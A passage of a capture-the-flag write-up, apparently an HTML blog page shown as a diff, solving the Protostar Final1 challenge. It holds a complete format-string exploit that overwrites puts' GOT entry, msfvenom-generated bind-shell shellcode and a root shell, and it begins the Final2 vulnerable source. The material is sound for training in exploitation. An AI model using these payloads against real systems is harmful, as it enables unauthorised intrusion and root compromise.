-</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">&quot;login &quot;</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">username</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>              <span class="n">printf</span><span class="p">(</span><span class="s">&quot;invalid protocol</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'>          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span><span class='line'>              <span class="n">logit</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
-</span><span class='line'>              <span class="n">printf</span><span class="p">(</span><span class="s">&quot;login failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
-</span><span class='line'>          <span class="p">}</span>
-</span><span class='line'>      <span class="p">}</span>
-</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[final1] $ &quot;</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">void</span> <span class="nf">getipport</span><span class="p">()</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">int</span> <span class="n">l</span><span class="p">;</span>
-</span><span class='line'>  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">getpeername</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;you don&#39;t exist&quot;</span><span class="p">);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">sprintf</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="s">&quot;%s:%d&quot;</span><span class="p">,</span> <span class="n">inet_ntoa</span><span class="p">(</span><span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">),</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span><span class="p">));</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/* Run the process as a daemon */</span>
-</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/* Wait for socket activity and return */</span>
-</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
-</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">getipport</span><span class="p">();</span>
-</span><span class='line'>  <span class="n">parser</span><span class="p">();</span>
-</span><span class='line'>
-</span><span class='line'><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We don&rsquo;t use spaces to find our format string to have more spaces left for
-exploit. Also, both <code>username</code> and <code>login</code> parameters are vulnerable, we use
-<code>username</code> to store shellcode and <code>login</code> for overwriting <code>GOT entry</code> for
-<code>puts()</code>. The line with timestamp is the entry from <code>/var/log/syslog</code> file.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + "A" * 109 + "BBBBCCCC"  + "\nlogin " + "%p" * 70 + "\n"'  | nc 0 2994
-</span><span class='line'>[final1] $ [final1] $ [final1] $ login failed
-</span><span class='line'>Jun 26 17:24:42 (none) final1: Login from 127.0.0.1:54427 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x8049ee40x804a2a00x804a2200xbffff7060xb7fd7ff40xbffff5580x69676f4c0x7266206e0x31206d6f0x302e37320x312e302e0x3434353a0x612037320x415b20730x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x424242420x434343430x6977205d0x702068740x777373610x2064726f0x2570255b0x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x257025700x25702570]
-</span><span class='line'>
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + "A" * 109 + "BBBBCCCC"  + "\nlogin " + "%p" * 43 + "\n"'  | nc 0 2994
-</span><span class='line'>[final1] $ [final1] $ [final1] $ login failed
-</span><span class='line'>Jun 26 17:26:22 (none) final1: Login from 127.0.0.1:54434 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x8049ee40x804a2a00x804a2200xbffff7060xb7fd7ff40xbffff5580x69676f4c0x7266206e0x31206d6f0x302e37320x312e302e0x3434353a0x612034330x415b20730x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x414141410x424242420x43434343]
-</span><span class='line'>
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + "A" * 109 + "BBBBCCCC"  + "\nlogin " + "%42\$p%43\$p" + "\n"'  | nc 0 2994
-</span><span class='line'>[final1] $ [final1] $ [final1] $ login failed
-</span><span class='line'>Jun 26 17:27:21 (none) final1: Login from 127.0.0.1:54435 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC] with password [0x424242420x43434343]</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We have 109 bytes for shellcode, not much but it should be sufficient.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@protostar:/tmp# objdump -t /opt/protostar/bin/final1  | grep username
-</span><span class='line'>0804a220 g     O .bss 00000080              username
-</span><span class='line'>
-</span><span class='line'>user@protostar:/tmp$ objdump -TR /opt/protostar/bin/final1 | grep puts
-</span><span class='line'>00000000      DF *UND*    00000000  GLIBC_2.0   puts
-</span><span class='line'>0804a194 R_386_JUMP_SLOT   puts</span></code></pre></td></tr></table></div></figure>
-
-
-<p>In order to pass this challenge, we need to store the address <code>0x0804a220</code> to
-<code>0x0804a194</code>. Our <code>formatter.rb</code> is the same script as in the <code>protostar format</code>
-challenges.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ruby1.9.1 ./formatter.rb 42:0x0804a194:0x0804a220
-</span><span class='line'>ruby -e 'print [0x0804a196].pack("V") + [0x0804a194].pack("V") + "%42\$2044x%42\$hn%43\$39452x%43\$hn"'</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Exploitation process:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># window1:
-</span><span class='line'>root@protostar:/tmp# gdb -q -ex 'set detach-on-fork off' -ex 'set follow-fork-mode child' -ex 'set disassembly-flavor intel' -ex 'run' /opt/protostar/bin/final1
-</span><span class='line'>Reading symbols from /opt/protostar/bin/final1...done.
-</span><span class='line'>Starting program: /opt/protostar/bin/final1 
-</span><span class='line'>[New process 29349]
-</span><span class='line'>[New process 29352]
-</span><span class='line'>
-</span><span class='line'># window2:
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + "A" * 109 + [0x0804a196].pack("V") + [0x0804a194].pack("V")  + "\nlogin " + "%42\$2044x%42\$hn%43\$39452x%43\$hn" + "\n"'  | nc 0 2994
-</span><span class='line'>[final1] $ [final1] $ [final1] $ ^C
-</span><span class='line'>
-</span><span class='line'># window1:
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>[Switching to process 29352]
-</span><span class='line'>0x08a1a2bd in ?? ()
-</span><span class='line'>
-</span><span class='line'>(gdb) x /x 0x0804a194
-</span><span class='line'>0x804a194 &lt;_GLOBAL_OFFSET_TABLE_+168>: 0x08a1a2bd</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So, we have <code>0x08a1a2bd</code> instead of <code>0x0804a220</code>, let&rsquo;s see the difference:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>0x08a1-0x0804 = 157
-</span><span class='line'>0xa2bd-0xa220 = 157</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Substracting <code>157</code> from <code>2044</code>, we got <code>1887</code> and that is the correct value, which we will use. Another try:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># window1:
-</span><span class='line'>root@protostar:/tmp# gdb -q -ex 'set detach-on-fork off' -ex 'set follow-fork-mode child' -ex 'set disassembly-flavor intel' -ex 'run' /opt/protostar/bin/final1
-</span><span class='line'>Reading symbols from /opt/protostar/bin/final1...done.
-</span><span class='line'>Starting program: /opt/protostar/bin/final1 
-</span><span class='line'>[New process 29370]
-</span><span class='line'>[New process 29373]
-</span><span class='line'>
-</span><span class='line'># window2:
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + "A" * 109 + [0x0804a196].pack("V") + [0x0804a194].pack("V")  + "\nlogin " + "%42\$1887x%42\$hn%43\$39452x%43\$hn" + "\n"'  | nc 0 2994
-</span><span class='line'>[final1] $ [final1] $ [final1] $ ^C
-</span><span class='line'>
-</span><span class='line'># window1:
-</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
-</span><span class='line'>[Switching to process 29373]
-</span><span class='line'>0x0804a28e in username ()
-</span><span class='line'>(gdb) x /x 0x0804a194
-</span><span class='line'>0x804a194 &lt;_GLOBAL_OFFSET_TABLE_+168>: 0x0804a220</span></code></pre></td></tr></table></div></figure>
-
-
-<p>That&rsquo;s correct, now we need to generate payload not longer than 109 bytes:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/payload_lengths.rb | awk ' $2&lt;=100' | grep 'linux/x86'
-</span><span class='line'>    linux/x86/adduser                                   97
-</span><span class='line'>    linux/x86/chmod                                     36
-</span><span class='line'>    linux/x86/exec                                      36
-</span><span class='line'>    linux/x86/meterpreter/bind_ipv6_tcp                 85
-</span><span class='line'>    linux/x86/meterpreter/bind_nonx_tcp                 63
-</span><span class='line'>    linux/x86/meterpreter/find_tag                      37
-</span><span class='line'>    linux/x86/meterpreter/reverse_ipv6_tcp              77
-</span><span class='line'>    linux/x86/meterpreter/reverse_nonx_tcp              50
-</span><span class='line'>    linux/x86/read_file                                 62
-</span><span class='line'>    linux/x86/shell/bind_ipv6_tcp                       85
-</span><span class='line'>    linux/x86/shell/bind_nonx_tcp                       63
-</span><span class='line'>    linux/x86/shell/find_tag                            37
-</span><span class='line'>    linux/x86/shell/reverse_ipv6_tcp                    77
-</span><span class='line'>    linux/x86/shell/reverse_nonx_tcp                    50
-</span><span class='line'>    linux/x86/shell_bind_ipv6_tcp                       90
-</span><span class='line'>    linux/x86/shell_bind_tcp                            78
-</span><span class='line'>    linux/x86/shell_bind_tcp_random_port                57
-</span><span class='line'>    linux/x86/shell_find_port                           62
-</span><span class='line'>    linux/x86/shell_find_tag                            69
-</span><span class='line'>    linux/x86/shell_reverse_tcp                         68</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2450 -b '\x0a\x0d\x00' -f sh
-</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-</span><span class='line'>No Arch selected, selecting Arch: x86 from the payload
-</span><span class='line'>Found 22 compatible encoders
-</span><span class='line'>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-</span><span class='line'>x86/shikata_ga_nai succeeded with size 105 (iteration=0)
-</span><span class='line'>Payload size: 105 bytes
-</span><span class='line'>export buf=\
-</span><span class='line'>$'\xda\xd9\xbd\xfe\xa6\x57\x8e\xd9\x74\x24\xf4\x5a\x31\xc9'\
-</span><span class='line'>$'\xb1\x14\x83\xc2\x04\x31\x6a\x15\x03\x6a\x15\x1c\x53\x66'\
-</span><span class='line'>$'\x55\x17\x7f\xda\x2a\x84\xea\xdf\x25\xcb\x5b\xb9\xf8\x8b'\
-</span><span class='line'>$'\xc7\x18\x51\xe3\xf5\xa4\x5c\x61\x93\xb4\x0f\xd5\xed\x54'\
-</span><span class='line'>$'\xc5\xb3\xb5\x5b\x9a\xb2\x07\x60\x28\xc0\x37\x0e\x83\x48'\
-</span><span class='line'>$'\x74\x7f\x7d\x85\xfb\xec\xdb\x7f\xc3\x4a\x11\xff\x72\x12'\
-</span><span class='line'>$'\x51\x97\xab\xcb\xd2\x0f\xdc\x3c\x77\xa6\x72\xca\x94\x68'\
-</span><span class='line'>$'\xd8\x45\xbb\x38\xd5\x98\xbc'</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ export buf=\
-</span><span class='line'>> $'\xda\xd9\xbd\xfe\xa6\x57\x8e\xd9\x74\x24\xf4\x5a\x31\xc9'\
-</span><span class='line'>> $'\xb1\x14\x83\xc2\x04\x31\x6a\x15\x03\x6a\x15\x1c\x53\x66'\
-</span><span class='line'>> $'\x55\x17\x7f\xda\x2a\x84\xea\xdf\x25\xcb\x5b\xb9\xf8\x8b'\
-</span><span class='line'>> $'\xc7\x18\x51\xe3\xf5\xa4\x5c\x61\x93\xb4\x0f\xd5\xed\x54'\
-</span><span class='line'>> $'\xc5\xb3\xb5\x5b\x9a\xb2\x07\x60\x28\xc0\x37\x0e\x83\x48'\
-</span><span class='line'>> $'\x74\x7f\x7d\x85\xfb\xec\xdb\x7f\xc3\x4a\x11\xff\x72\x12'\
-</span><span class='line'>> $'\x51\x97\xab\xcb\xd2\x0f\xdc\x3c\x77\xa6\x72\xca\x94\x68'\
-</span><span class='line'>> $'\xd8\x45\xbb\x38\xd5\x98\xbc'
-</span><span class='line'>
-</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "username " + ENV["buf"] + "A" * (109-105) + [0x0804a196].pack("V") + [0x0804a194].pack("V")  + "\nlogin " + "%42\$1887x%42\$hn%43\$39452x%43\$hn" + "\n"'  | nc 0 2994
-</span><span class='line'>[final1] $ [final1] $ [final1] $ ^C
-</span><span class='line'>user@protostar:/tmp$ nc 0 2450
-</span><span class='line'>id
-</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>
-
-
-<h2>Protostar Final2</h2>
-
-<figure class='code'><figcaption><span>final2.c </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-<span class='line-number'>60</span>
-<span class='line-number'>61</span>
-<span class='line-number'>62</span>
-<span class='line-number'>63</span>
-<span class='line-number'>64</span>
-<span class='line-number'>65</span>
-<span class='line-number'>66</span>
-<span class='line-number'>67</span>
-<span class='line-number'>68</span>
-<span class='line-number'>69</span>
-<span class='line-number'>70</span>
-<span class='line-number'>71</span>
-<span class='line-number'>72</span>
-<span class='line-number'>73</span>
-<span class='line-number'>74</span>
-<span class='line-number'>75</span>
-<span class='line-number'>76</span>
-</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &quot;../common/common.c&quot;</span>
-</span><span class='line'><span class="cp">#include &quot;../common/malloc.c&quot;</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">#define NAME &quot;final2&quot;</span>
-</span><span class='line'><span class="cp">#define UID 0</span>
-</span><span class='line'><span class="cp">#define GID 0</span>
-</span><span class='line'><span class="cp">#define PORT 2993</span>
-</span><span class='line'>
-</span><span class='line'><span class="cp">#define REQSZ 128</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">void</span> <span class="nf">check_path</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">start</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">int</span> <span class="n">l</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/*</span>
-</span><span class='line'><span class="cm">  * Work out old software bug</span>
-</span><span class='line'><span class="cm">  */</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">p</span> <span class="o">=</span> <span class="n">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
-</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
-</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="n">start</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;ROOT&quot;</span><span class="p">);</span>
-</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>          <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="n">start</span><span class="o">--</span><span class="p">;</span>
-</span><span class='line'>          <span class="n">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">);</span>
-</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;moving from %p to %p (exploit: %s / %d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">buf</span> <span class="o">?</span>  <span class="s">&quot;yes&quot;</span> <span class="o">:</span> <span class="s">&quot;no&quot;</span><span class="p">,</span> <span class="n">start</span> <span class="o">-</span> <span class="n">buf</span><span class="p">);</span>
-</span><span class='line'>      <span class="p">}</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">get_requests</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">destroylist</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
-</span><span class='line'>  <span class="kt">int</span> <span class="n">dll</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="n">dll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">dll</span> <span class="o">&gt;=</span> <span class="mi">255</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>      <span class="n">buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="o">!=</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;FSRD&quot;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>      <span class="n">check_path</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
-</span><span class='line'>
-</span><span class='line'>      <span class="n">dll</span><span class="o">++</span><span class="p">;</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dll</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span><span class='line'>                <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;Process OK</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">&quot;Process OK</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">));</span>
-</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="n">destroylist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
-</span><span class='line'>  <span class="p">}</span>
-</span><span class='line'><span class="p">}</span>
-</span><span class='line'>
-</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span><span class='line'><span class="p">{</span>
-</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
-</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
-</span><span class='line'>
-</span><span class='line'>  <span class="cm">/* Run the process as a daemon */</span>
